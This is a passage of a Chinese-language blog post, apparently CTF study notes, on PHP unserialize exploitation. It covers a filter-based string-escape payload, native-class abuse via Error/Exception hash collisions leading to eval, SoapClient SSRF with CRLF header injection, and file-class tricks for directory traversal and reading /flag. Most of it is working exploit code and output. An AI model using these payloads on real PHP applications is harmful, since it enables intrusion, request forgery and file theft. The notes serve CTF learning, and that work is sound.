class="string">&#x27;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;Z3Vlc3RfaW1nLnBuZw==&#x27;</span>;<span class="comment">//ä¸å¯æ§å˜é‡ï¼Œå›ºå®šå€¼base64_encode(&#x27;guest_img.png&#x27;)</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&quot;è¿‡æ»¤å‰:&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>),<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿‡æ»¤å:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&gt;&gt;</span><br><span class="line">è¿‡æ»¤å‰:</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;</span><br><span class="line">s:<span class="number">41</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">è¿‡æ»¤å:</span></span><br><span class="line"><span class="string">a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:4:&quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">éœ€è¦è®¡ç®—è¿‡æ»¤å¤„åˆ°ç›®æ ‡å­ä¸²çš„é•¿åº¦ï¼š&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot; é•¿åº¦ä¸º23ï¼Œä¸ä¸º3æˆ–4çš„å€æ•°ï¼Œæœ€æ¥è¿‘çš„æ˜¯24ï¼Œæ‰€ä»¥åœ¨</span></span><br><span class="line"><span class="string">ç›®æ ‡å­ä¸²å¤´æ·»åŠ ä»»æ„ä¸€ä¸ªå­—ç¬¦å˜æˆa&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">æ‰€ä»¥è¿‡æ»¤åä¼šåƒæ‰<span class="number">24</span>ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å¯ä»¥é€‰æ‹©<span class="number">4</span>*<span class="number">6</span>æˆ–è€…<span class="number">3</span>*<span class="number">8</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;<span class="comment">//è¿‡æ»¤åå­—ç¬¦å‡å°‘</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>]=<span class="string">&#x27;flagflagflagflagflagflag&#x27;</span>;<span class="comment">//è¿‡æ»¤åå‘ååƒ24ä¸ªå­—ç¬¦ï¼Œæˆ–è€…php*8</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>]=<span class="string">&#x27;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:4:&quot;khaz&quot;;s:4:&quot;haha&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;Z3Vlc3RfaW1nLnBuZw==&#x27;</span>;<span class="comment">//ä¸å¯æ§å˜é‡ï¼Œå›ºå®šå€¼</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&quot;è¿‡æ»¤å‰:&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>),<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿‡æ»¤å:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"></span><br><span class="line">è¿‡æ»¤å‰:</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">è¿‡æ»¤å:</span></span><br><span class="line"><span class="string">a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:24:&quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">E:\xampp2\php\www\2.php:19:</span></span><br><span class="line"><span class="string">array(3) &#123;</span></span><br><span class="line"><span class="string">  &#x27;user&#x27; =&gt;</span></span><br><span class="line"><span class="string">  string(24) &quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="string">&#x27;img&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">20</span>) <span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span></span><br><span class="line">  <span class="string">&#x27;khaz&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;haha&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;æ·»åŠ äº†è¿™ä¸ªæ˜¯å› ä¸º<span class="variable">$_SESSION</span>æœ‰ä¸‰ä¸ªå€¼(a:<span class="number">3</span>),æ•°é‡è¦å¯¹çš„ä¸Šæ‰èƒ½ååºåˆ—åŒ–</span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;</span><br><span class="line">s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;</span><br></pre></td></tr></table></figure><h1 id="åŸç”Ÿç±»åˆ©ç”¨"><a href="#åŸç”Ÿç±»åˆ©ç”¨" class="headerlink" title="åŸç”Ÿç±»åˆ©ç”¨"></a>åŸç”Ÿç±»åˆ©ç”¨</h1><h2 id="å¸¸è§åœºæ™¯"><a href="#å¸¸è§åœºæ™¯" class="headerlink" title="å¸¸è§åœºæ™¯"></a>å¸¸è§åœºæ™¯</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">key</span>(<span class="variable">$this</span>-&gt;value);</span><br></pre></td></tr></table></figure><h2 id="è·å–æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»"><a href="#è·å–æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»" class="headerlink" title="è·å–æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»"></a>è·å–æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>(); <span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>); <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>( <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__toString&#x27;</span>, <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__callStatic&#x27;</span>, <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__unset&#x27;</span>, <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>å¯ä»¥æ ¹æ®é¢˜ç›®ç¯å¢ƒå°†æŒ‡å®šçš„æ–¹æ³•æ·»åŠ è¿›æ¥, æ¥éå†å­˜åœ¨æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»</p><p>æ¯”å¦‚è¯´é¢˜ç›®ç»™çš„ä»£ç æœ‰MD5ï¼Œevalç­‰ï¼Œè¿™äº›å‡½æ•°çš„å‚æ•°éƒ½æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥è§¦å‘<code>__tostring</code>é­”æœ¯æ–¹æ³•</p></blockquote><h2 id="Error-x2F-Exception-ç±»"><a href="#Error-x2F-Exception-ç±»" class="headerlink" title="Error&#x2F;Exception ç±»"></a>Error&#x2F;Exception ç±»</h2><blockquote><p>ç”¨äºè‡ªå®šä¹‰é”™è¯¯ç±»å‹çš„</p></blockquote><table><thead><tr><th align="center">ç±»</th><th align="center">é€‚ç”¨ç‰ˆæœ¬</th><th align="center">å±æ€§ï¼ˆä¸€æ ·çš„ï¼‰</th></tr></thead><tbody><tr><td align="center">Error</td><td align="center">php7</td><td align="center">messageï¼šå¼‚å¸¸æ¶ˆæ¯å†…å®¹                                                           fileï¼šæŠ›å‡ºå¼‚å¸¸çš„æ–‡ä»¶å</td></tr><tr><td align="center">Exception</td><td align="center">php5&#x2F;php7</td><td align="center">lineï¼šæŠ›å‡ºå¼‚å¸¸åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œå·                                         codeï¼šå¼‚å¸¸ä»£ç </td></tr></tbody></table><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line"><span class="built_in">Error</span>: payload in D:\phpstudy_pro\phpstudy_pro\WWW\test\<span class="number">1</span>.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Error</span>: payload in D:\phpstudy_pro\phpstudy_pro\WWW\test\<span class="number">1</span>.php:<span class="number">3</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure><p>ä»”ç»†è§‚å¯Ÿä¼šå‘ç°åªæœ‰å¼‚å¸¸ä»£ç codeæ²¡æœ‰è¢«è¾“å‡ºï¼Œå¹¶ä¸”åªæœ‰è¡Œå·lineä¸åŒ</p><p>åˆ©ç”¨</p><blockquote><p>å¯ç”¨æ¥ç»•è¿‡ç±»å±æ€§çš„å“ˆå¸Œæ¯”è¾ƒ</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($a)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($b)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($a)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($b)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>===<span class="variable">$b</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ç›¸åŒ&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ä¸ç›¸åŒ&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807151831343.png" alt="image-20220807151831343"></p><blockquote><p>å€¼ä¸ç›¸åŒï¼ˆå¯¹è±¡ï¼Œå¼‚å¸¸ä»£ç ä¸åŒï¼‰,md5å’Œsha1çš„å€¼ç›¸åŒï¼ˆè¾“å‡ºçš„æ˜¯ä¸€æ ·çš„ï¼‰</p></blockquote><h3 id="æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )</span><br><span class="line">    </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br></pre></td></tr></table></figure><p>å¤šäº†ä¸€ä¸ªeval</p><p>åªéœ€è¦å°†payloadæ„é€ ä¸º<code>?&gt;&lt;? payload?&gt;</code>çš„å½¢å¼å³å¯,å‰é¢çš„<code>?&gt;</code>æŠŠæ–‡ä»¶åŸæ¥çš„<code>&lt;?php</code>é—­åˆäº†ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>( <span class="meta">?&gt;</span>    <span class="meta">&lt;?php</span> payload <span class="meta">?&gt;</span>        )    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SoapClientç±»"><a href="#SoapClientç±»" class="headerlink" title="SoapClientç±»"></a>SoapClientç±»</h2><blockquote><p>å†…ç½®callæ–¹æ³•ï¼Œå½“callæ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œå°±ä¼šå‘èµ·httpè¯·æ±‚ï¼Œå¯ä»¥ä¼ªé€ ssrfè¯·æ±‚</p><p>å¹¶å› ä¸ºå¯ä»¥è‡ªå®šä¹‰user_agentè¯·æ±‚å¤´ä»è€Œé€ æˆcrlfæ¼æ´ã€‚</p></blockquote><p>å¯èƒ½ä¼šå‡ºç°çš„é—®é¢˜<a href="https://stackoverflow.com/questions/11391442/fatal-error-class-soapclient-not-found">Fatal error: Uncaught Error: Class â€˜SoapClientâ€™ not found in</a></p><blockquote><p>CRLFæ³¨å…¥æ˜¯ä¸€ç±»æ³¨å…¥æ¼æ´ã€‚æ˜¯â€œå›è½¦+æ¢è¡Œâ€çš„ç®€ç§°ï¼Œåˆå«åšå›è½¦æ¢è¡Œç¬¦ã€‚<br>è¡¨ç¤ºä¸º<code>\r\n</code>ï¼Œç¼–ç ä¹‹åæ˜¯<code>%0d%0a</code>ã€‚è¿™ä¸ªåœ¨HTTPåè®®ä¸­è¡¨ç¤ºæ¶ˆæ¯å¤´ä¸æ¶ˆæ¯ä½“ä¹‹é—´çš„åˆ†éš”ã€‚</p><p>æµè§ˆå™¨å°±æ˜¯æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥åˆ†ç¦»HTTPHeaderä¸HTTPBodyçš„ã€‚ä»è€ŒæŠŠHTTPå†…å®¹æ˜¾ç¤ºå‡ºæ¥ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶HTTPæ¶ˆæ¯å¤´çš„å­—ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¤Ÿæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œã€‚</p></blockquote><p>ä¾‹å­SoapClient::callæ–¹æ³•å‘é€soapè¯·æ±‚,ä¼ªé€ postæ•°æ®</p><p>åœ¨linuxä¸‹æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://192.168.244.128:8888/&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;data=abc&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">  <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;khaz^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">notexists</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="../images/image-20221027114101336.png" alt="image-20221027114101336" style="zoom:67%;" /><p>å› ä¸ºæˆ‘ä»¬è®¾ç½®äº†Content-lengthï¼Œé‚£ä¹ˆè¯»å–äº†data&#x3D;abcåå°±ä¼šèˆå¼ƒæ‰åé¢çš„æ•°æ®</p><h2 id="æ–‡ä»¶æ“ä½œç±»"><a href="#æ–‡ä»¶æ“ä½œç±»" class="headerlink" title="æ–‡ä»¶æ“ä½œç±»"></a>æ–‡ä»¶æ“ä½œç±»</h2><p>æ³¨ï¼šFilesystemIterator æ˜¯DirectoryIteratorçš„å­ç±»ï¼Œæ‰€ä»¥å¯ä»¥å°†DirectoryIteratoræ¢ä¸ºFilesystemIteratorã€‚</p><h4 id="éå†ç›®å½•"><a href="#éå†ç›®å½•" class="headerlink" title="éå†ç›®å½•"></a>éå†ç›®å½•</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;./&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$tmp</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$tmp</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="../images/image-20221128122840348.png" alt="image-20221128122840348" style="zoom:80%;" /><h4 id="æŸ¥æ‰¾æ–‡ä»¶"><a href="#æŸ¥æ‰¾æ–‡ä»¶" class="headerlink" title="æŸ¥æ‰¾æ–‡ä»¶"></a>æŸ¥æ‰¾æ–‡ä»¶</h4><ul><li><p>æŸ¥æ‰¾æ ¹ç›®å½•çš„flagæ–‡ä»¶å</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&quot;f*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128123553510.png" alt="image-20221128123553510"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///f*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20221128123054538.png" alt="image-20221128123054538"></p><blockquote><p>â€‹<strong>GlobIterator ç±»æ”¯æŒç›´æ¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„</strong></p></blockquote><ul><li><p>ç¡®è®¤æ–‡ä»¶è·¯å¾„</p><p>å‡è®¾ç°åœ¨çŸ¥é“flagçš„æ–‡ä»¶åä¸ºflagï¼Œä½†ä¸çŸ¥é“å…·ä½“è·¯å¾„</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># ç›®å½•ç©¿è¶Š</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob://../../../flag&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128123216008.png" alt="image-20221128123216008"></p><p>å½“è¾“å‡ºflagæ—¶ï¼Œè¯´æ˜è·¯å¾„æ˜¯æ­£ç¡®çš„ã€‚</p></li></ul><h4 id="è¯»å–æ–‡ä»¶"><a href="#è¯»å–æ–‡ä»¶" class="headerlink" title="è¯»å–æ–‡ä»¶"></a>è¯»å–æ–‡ä»¶</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f1ag</span>=<span class="title function_ invoke__">implode</span>(<span class="keyword">array</span>(<span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/flag&#x27;</span>)));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$f1ag</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128122206828.png" alt="image-20221128122206828"></p><h1 id="ä¸€äº›ç»•è¿‡trick"><a href="#ä¸€äº›ç»•è¿‡trick" class="headerlink" title="ä¸€äº›ç»•è¿‡trick"></a>ä¸€äº›ç»•è¿‡trick</h1><p><a 